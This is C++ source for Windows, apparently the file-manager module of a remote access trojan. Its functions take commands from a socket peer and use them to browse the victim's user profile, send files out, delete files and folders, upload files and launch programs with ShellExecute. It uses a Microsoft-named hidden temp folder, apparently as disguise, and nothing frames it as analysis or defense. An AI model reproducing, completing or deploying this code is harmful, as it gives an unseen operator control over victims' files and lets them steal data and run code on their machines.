#include "MSConfig.h"

void browse(SOCKET& ConnectSocket)
{
     char command[1024], response[1024], temppath[2048];
     int res;
     string totr, path;
     
     GetEnvironmentVariable("USERPROFILE", temppath, 2048);
     path = temppath;
     path += "\\";
     
     sprintf(command, "%s+", path.c_str());
     send(ConnectSocket, command, (int)strlen(command), 0);
     
     
     while (1)
     {
           totr.clear();
           do
           {
                        res = recv(ConnectSocket, response, 1024, 0);
                        response[res] = '\0';
                        totr += response;
           } while (totr[totr.length() - 1] != '+');
           totr.erase(totr.length() - 1, 1);
           
           if (totr == "ls") ls(ConnectSocket, path);
           else if (totr == "cd") cd(ConnectSocket, path);
           else if (totr == "dl") dl(ConnectSocket, path);
           else if (totr == "rm") rm(ConnectSocket, path);
           else if (totr == "exec") exec(ConnectSocket, path);
           else if (totr == "upl") upl(ConnectSocket, path);
           else if (totr == "mkdir") mkdir(ConnectSocket, path);
           else if (totr == "rmdir") rmdir(ConnectSocket, path);
           else if (totr == "exit") return;
     }
     
     
     
     return;
}


int upl(SOCKET& ConnectSocket, string path)
{
    char command[1024], response[16384], tbup[1024];
    int res, totalres, fsize;
    string totr;
    FILE * target;
    FILE * ch;
    HANDLE hw;
    WIN32_FIND_DATA fd;
    
    sprintf(tbup, "%s902178436754.glou", path.c_str());
    ch = fopen(tbup, "wb");
    if (ch == NULL)
    {
           strcpy(command, "NO_FAIL_QQ+");
           send(ConnectSocket, command, (int)strlen(command), 0);
           return 1;
    }
    else
    {
        fclose(ch);
        DeleteFile(tbup);
        strcpy(command, "OK+");
        send(ConnectSocket, command, (int)strlen(command), 0);
    }
    
    while (1)
    {
          totr.clear();
          do
          {
                       res = recv(ConnectSocket, response, 1024, 0);
                       response[res] = '\0';
                       totr += response;
          } while (totr[totr.length() - 1] != '+');
          totr.erase(totr.length() - 1, 1);
          if (totr == "DONE_THE_END_QQ") break;
          sprintf(tbup, "%s%s", path.c_str(), totr.c_str());
          hw = FindFirstFile(tbup, &fd);
          if (hw != INVALID_HANDLE_VALUE)
          {
                 strcpy(command, "NO_FAIL_QQ+");
                 send(ConnectSocket, command, (int)strlen(command), 0);
                 continue;
          }
          strcpy(command, "OK+");
          send(ConnectSocket, command, (int)strlen(command), 0);
          totr.clear();
          do
          {
                       res = recv(ConnectSocket, response, 1024, 0);
                       response[res] = '\0';
                       totr += response;
          } while (totr[totr.length() - 1] != '+');
          totr.erase(totr.length() - 1, 1);
          fsize = atoi(totr.c_str());
          
          target = fopen(tbup, "wb");
          totalres = 0;
          
          strcpy(command, "OK+");
          send(ConnectSocket, command, (int)strlen(command), 0);
          
          do
          {
                              res = recv(ConnectSocket, response, 16384, 0);
                              fwrite(response, 1, res, target);
                              fflush(target);
                              totalres += res;
          } while (totalres < fsize);
          
          fclose(target);
          strcpy(command, "OK+");
          send(ConnectSocket, command, (int)strlen(command), 0);
          
    }
    
    return 0;
}
    

int rmdir(SOCKET& ConnectSocket, string path)
{
    char command[1024], response[1024], tbrm[1024];
    int res, cres;
    string totr;
    HANDLE hw;
    WIN32_FIND_DATA fd;
    
    strcpy(command, "OK+");
    send(ConnectSocket, command, (int)strlen(command), 0);
    
    totr.clear();
    do
    {
                 res = recv(ConnectSocket, response, 1024, 0);
                 response[res] = '\0';
                 totr += response;
    } while (totr[totr.length() - 1] != '+');
    totr.erase(totr.length() - 1, 1);
    int limit = atoi(totr.c_str());
    
    int i = 0;
    path += "*";
    hw = FindFirstFile(path.c_str(), &fd);
    do
    {
         i ++;
    } while ((i != atoi(totr.c_str())) && (FindNextFile(hw, &fd) != 0) );
    if (i != limit)
    {
          strcpy(command, "NO_FAILED_QQ+");
          send(ConnectSocket, command, (int)strlen(command), 0);
          return 1;
    }  
    path.erase(path.size() - 1, 1);
    sprintf(command, "%s+", fd.cFileName);
    send(ConnectSocket, command, (int)strlen(command), 0);
    
    totr.clear();
    do
    {
                 res = recv(ConnectSocket, response, 1024, 0);
                 response[res] = '\0';
                 totr += response;
    } while (totr[totr.length() - 1] != '+');
    totr.erase(totr.length() - 1, 1);
    
    strcpy(tbrm, path.c_str());
    strcat(tbrm, fd.cFileName);
    
    cres = RemoveDirectory(tbrm);
    
    if (cres == 0) strcpy(command, "NO_FAIL_QQ+");
    else strcpy(command, "OK+");
    send(ConnectSocket, command, (int)strlen(command), 0);
    
    return 0;
}


int mkdir(SOCKET& ConnectSocket, string path)
{
    char command[1024], response[1024], tbcr[1024];
    int res, cres;
    string totr;
    
    strcpy(command, "OK+");
    send(ConnectSocket, command, (int)strlen(command), 0);
    
    totr.clear();
    do
    {
                 res = recv(ConnectSocket, response, 1024, 0);
                 response[res] = '\0';
                 totr += response;
    } while (totr[totr.length() - 1] != '+');
    totr.erase(totr.length() - 1, 1);
    
    strcpy(tbcr, path.c_str());
    strcat(tbcr, totr.c_str());
    
    cres = CreateDirectory(tbcr, NULL);
    
    if (cres == 0) strcpy(command, "NO_FAIL_QQ+");
    else strcpy(command, "OK+");
    send(ConnectSocket, command, (int)strlen(command), 0);
    
    return 0;
}


int exec(SOCKET& ConnectSocket, string path)
{
    char command[1024], response[1024], tbxc[1024];
    int res, cres;
    string totr;
    HANDLE hw;
    WIN32_FIND_DATA fd;
    
    strcpy(command, "OK+");
    send(ConnectSocket, command, (int)strlen(command), 0);
    
    totr.clear();
    do
    {
                 res = recv(ConnectSocket, response, 1024, 0);
                 response[res] = '\0';
                 totr += response;
    } while (totr[totr.length() - 1] != '+');
    totr.erase(totr.length() - 1, 1);
    if ((totr[0] >= 48) && (totr[0] <= 57))
    {
	
		    int limit = atoi(totr.c_str());
		    
		    int i = 0;
		    path += "*";
		    hw = FindFirstFile(path.c_str(), &fd);
		    do
		    {
		         i ++;
		    } while ((i != atoi(totr.c_str())) && (FindNextFile(hw, &fd) != 0) );
		    if (i != limit)
		    {
		          strcpy(command, "NO_FAILED_QQ+");
		          send(ConnectSocket, command, (int)strlen(command), 0);
		          return 1;
		    }      
		    path.erase(path.size() - 1, 1);
		    sprintf(command, "%s+", fd.cFileName);
		    send(ConnectSocket, command, (int)strlen(command), 0);
		    
		    totr.clear();
		    do
		    {
		                 res = recv(ConnectSocket, response, 1024, 0);
		                 response[res] = '\0';
		                 totr += response;
		    } while (totr[totr.length() - 1] != '+');
		    totr.erase(totr.length() - 1, 1);
		    
		    strcpy(tbxc, path.c_str());
		    strcat(tbxc, fd.cFileName);
	}
	else strcpy(tbxc, totr.c_str());

    ShellExecute(NULL, "open", tbxc, NULL, NULL, SW_SHOWNORMAL);
    
    strcpy(command, "OK+");
    send(ConnectSocket, command, (int)strlen(command), 0);
    
    return 0;
}


int rm(SOCKET& ConnectSocket, string path)
{
    char command[1024], response[1024], pathb[4096], tbrm[1024], minmax[16];
    int min, max, res, cres;
    string totr;
    HANDLE hw;
    WIN32_FIND_DATA fd;
    
    strcpy(command, "OK+");
    send(ConnectSocket, command, (int)strlen(command), 0);
    
    totr.clear();
    do
    {
                 res = recv(ConnectSocket, response, 1024, 0);
                 response[res] = '\0';
                 totr += response;
    } while (totr[totr.length() - 1] != '+');
    totr.erase(totr.length() - 1, 1);
    strcpy(minmax, totr.c_str());
    
    min = atoi(strtok(minmax, "-"));
    max = atoi(strtok(NULL, "-"));
    int i = 1;
    sprintf(tbrm, "%s*", path.c_str());
    hw = FindFirstFile(tbrm, &fd);
    do
    {
         if ((i >= min) && (i <= max))
         {
                sprintf(command, "%s+", fd.cFileName);
                send(ConnectSocket, command, (int)strlen(command), 0);
                totr.clear();
                do
                {
                             res = recv(ConnectSocket, response, 1024, 0);
                             response[res] = '\0';
                             totr += response;
                } while (totr[totr.length() - 1] != '+');
                totr.erase(totr.length() - 1, 1);
                
                sprintf(pathb, "%s%s", path.c_str(), fd.cFileName);
                cres = DeleteFile(pathb);
                
                if (cres == 0) strcpy(command, "NO_FAIL_QQ+");
                else strcpy(command, "OK+");
                send(ConnectSocket, command, (int)strlen(command), 0);
                totr.clear();
                do
                {
                             res = recv(ConnectSocket, response, 1024, 0);
                             response[res] = '\0';
                             totr += response;
                } while (totr[totr.length() - 1] != '+');
                totr.erase(totr.length() - 1, 1);
         }
         i ++;
    } while ((FindNextFile(hw, &fd) != 0));
    
    strcpy(command, "END_QQ_THE_END+");
    send(ConnectSocket, command, (int)strlen(command), 0);
    
    return 0;
}


int dl(SOCKET& ConnectSocket, string path)
{
    char command[1024], response[1024], tbdl[1024], pathb[4096], minmax[16];
    int min, max, res;
    string totr;
    FILE * fch;
    HANDLE hw;
    WIN32_FIND_DATA fd;
    
    strcpy(command, "OK+");
    send(ConnectSocket, command, (int)strlen(command), 0);
    
    totr.clear();
    do
    {
                 res = recv(ConnectSocket, response, 1024, 0);
                 response[res] = '\0';
                 totr += response;
    } while (totr[totr.length() - 1] != '+');
    totr.erase(totr.length() - 1, 1);
    strcpy(minmax, totr.c_str());
    
    min = atoi(strtok(minmax, "-"));
    max = atoi(strtok(NULL, "-"));
    int i = 1;
    sprintf(tbdl, "%s*", path.c_str());
    hw = FindFirstFile(tbdl, &fd);
    do
    {
         if ((i >= min) && (i <= max))
         {
                sprintf(command, "%s+", fd.cFileName);
                send(ConnectSocket, command, (int)strlen(command), 0);
                totr.clear();
                do
                {
                             res = recv(ConnectSocket, response, 1024, 0);
                             response[res] = '\0';
                             totr += response;
                } while (totr[totr.length() - 1] != '+');
                totr.erase(totr.length() - 1, 1);
                
                sprintf(pathb, "%s%s", path.c_str(), fd.cFileName);
                fch = fopen(pathb, "rb");
                if ((fch == NULL) || (fd.nFileSizeLow == 0))
                {
                        strcpy(command, "NO_FAIL_QQ+");
                        send(ConnectSocket, command, (int)strlen(command), 0);
                        i ++;
                        continue;
                }
                else
                {
                    strcpy(command, "OK+");
                    fclose(fch);
                }
                send(ConnectSocket, command, (int)strlen(command), 0);
                totr.clear();
                do
                {
                             res = recv(ConnectSocket, response, 1024, 0);
                             response[res] = '\0';
                             totr += response;
                } while (totr[totr.length() - 1] != '+');
                totr.erase(totr.length() - 1, 1);
                strcpy(pathb, path.c_str());
                transfer(ConnectSocket, fd.cFileName, pathb, fd.nFileSizeLow, "WE");
         }
         i ++;
    } while ((FindNextFile(hw, &fd) != 0));
    
    strcpy(command, "END_FAIL_THE_END+");
    send(ConnectSocket, command, (int)strlen(command), 0);
    
    return 0;
}

int ls(SOCKET& ConnectSocket, string path)
{
    char command[1024], response[1024];
    int res;
    string totr;
    HANDLE hw;
    WIN32_FIND_DATA fd;

    path += "*";
    hw = FindFirstFile(path.c_str(), &fd);
    if (hw == INVALID_HANDLE_VALUE)
    {
           strcpy(command, "NO_FAIL_QQ+");
           send(ConnectSocket, command, (int)strlen(command), 0);
           return 1;
    }
    do
    {
           wsprintf(command, "%s+", fd.cFileName);
           send(ConnectSocket, command, (int)strlen(command), 0);
           
           totr.clear();
           do
           {
                        res = recv(ConnectSocket, response, 1024, 0);
                        response[res] = '\0';
                        totr += response;
           } while (totr[totr.length() - 1] != '+');
           totr.erase(totr.length() - 1, 1);
           
           if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) sprintf(command, "%d+", fd.nFileSizeLow);
           else strcpy(command, "DIR_FTW+");
           send(ConnectSocket, command, (int)strlen(command), 0);
           
           totr.clear();
           do
           {
                        res = recv(ConnectSocket, response, 1024, 0);
                        response[res] = '\0';
                        totr += response;
           } while (totr[totr.length() - 1] != '+');
           totr.erase(totr.length() - 1, 1);
           
    } while ((FindNextFile(hw, &fd) != 0));
    
    strcpy(command, "DONE_QQ_THE_END+");
    send(ConnectSocket, command, (int)strlen(command), 0);
    
    return 0;    
}


int cd(SOCKET& ConnectSocket, string& path)
{
    char command[1024], response[1024];
    int res, i = 0;
    string totr, trypath;
    HANDLE hw;
    WIN32_FIND_DATA fd;
    DWORD attr;
    
    trypath = path;
    
    strcpy(command, "OK+");
    send(ConnectSocket, command, (int)strlen(command), 0);
    
    totr.clear();
    do
    {
                 res = recv(ConnectSocket, response, 1024, 0);
                 response[res] = '\0';
                 totr += response;
    } while (totr[totr.length() - 1] != '+');
    totr.erase(totr.length() - 1, 1);
    int limit = atoi(totr.c_str());
    
    if ((totr == "$DEEP") || (totr == "$HOME"))
    {
             path.clear();
             char temp[1024];
             if (totr == "$DEEP")
             {
                      GetTempPath(1024, temp);
                      strcat(temp, "Microsoft_9021784367548932\\");
             }
             else
             {
                 GetEnvironmentVariable("USERPROFILE", temp, 1024);
                 strcat(temp, "\\");
             }
             path = temp;
             
             strcpy(command, "OK+");
             send(ConnectSocket, command, (int)strlen(command), 0);             

             totr.clear();
             do
             {
                          res = recv(ConnectSocket, response, 1024, 0);
                          response[res] = '\0';
                          totr += response;
             } while (totr[totr.length() - 1] != '+');
             totr.erase(totr.length() - 1, 1);

             sprintf(command, "%s+", path.c_str());
             send(ConnectSocket, command, (int)strlen(command), 0);
             return 0;
    }
    else if (totr == "..")
    {
         trypath.erase(trypath.length() - 3, 3);
         do
         {
                                        trypath.erase(trypath.length() - 1, 1);
         } while (trypath[trypath.length() - 1] != '\\');
         path = trypath;
         
         strcpy(command, "OK+");
         send(ConnectSocket, command, (int)strlen(command), 0);
         
         totr.clear();
         do
         {
                      res = recv(ConnectSocket, response, 1024, 0);
                      response[res] = '\0';
                      totr += response;
         } while (totr[totr.length() - 1] != '+');
         totr.erase(totr.length() - 1, 1);
             
         sprintf(command, "%s+", path.c_str());
         send(ConnectSocket, command, (int)strlen(command), 0);
         
         return 0;
    }
    
    path += "*";
    hw = FindFirstFile(path.c_str(), &fd);
    do
    {
         i ++;
    } while ((i != limit) && (FindNextFile(hw, &fd) != 0) );
    path.erase(path.length() - 1, 1);
    sprintf(command, "%s+", fd.cFileName);
    send(ConnectSocket, command, (int)strlen(command), 0);
    totr.clear();
    do
    {
                 res = recv(ConnectSocket, response, 1024, 0);
                 response[res] = '\0';
                 totr += response;
    } while (totr[totr.length() - 1] != '+');
    totr.erase(totr.length() - 1, 1);
    if  ((i != limit) || (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)))
    {
        if (i != limit) strcpy(command, "NO_FAIL_QQ_1+");
        else if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) strcpy(command, "NO_FAIL_QQ_2+");
        send(ConnectSocket, command, (int)strlen(command), 0);
        return 1;
    }
    
    path += fd.cFileName;
    path += "\\";
    
    sprintf(command, "%s+", path.c_str());
    send(ConnectSocket, command, (int)strlen(command), 0);
    
    return 0;
    
}
